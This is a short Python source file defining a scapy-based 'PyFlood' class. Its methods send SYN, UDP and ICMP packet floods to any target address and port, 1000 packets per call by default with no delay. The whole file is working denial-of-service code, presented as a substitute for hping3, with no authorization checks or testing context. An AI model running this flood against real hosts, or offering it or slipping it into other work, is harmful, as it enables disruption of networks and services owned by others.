"""Python-based packet flood using scapy (no hping3 needed)."""
from scapy.all import IP, TCP, UDP, ICMP, Raw, send
import time

class PyFlood:
    def __init__(self, target, port=80):
        self.target = target
        self.port = port

    def syn(self, count=1000, delay=0):
        pkt = IP(dst=self.target)/TCP(dport=self.port, flags="S")
        t0 = time.time()
        send(pkt, count=count, inter=delay, verbose=0)
        return {"mode": "syn", "count": count, "elapsed": round(time.time()-t0, 2)}

    def udp(self, count=1000, payload="X"*64, delay=0):
        pkt = IP(dst=self.target)/UDP(dport=self.port)/Raw(load=payload)
        t0 = time.time()
        send(pkt, count=count, inter=delay, verbose=0)
        return {"mode": "udp", "count": count, "elapsed": round(time.time()-t0, 2)}

    def icmp(self, count=1000, delay=0):
        pkt = IP(dst=self.target)/ICMP()
        t0 = time.time()
        send(pkt, count=count, inter=delay, verbose=0)
        return {"mode": "icmp", "count": count, "elapsed": round(time.time()-t0, 2)}
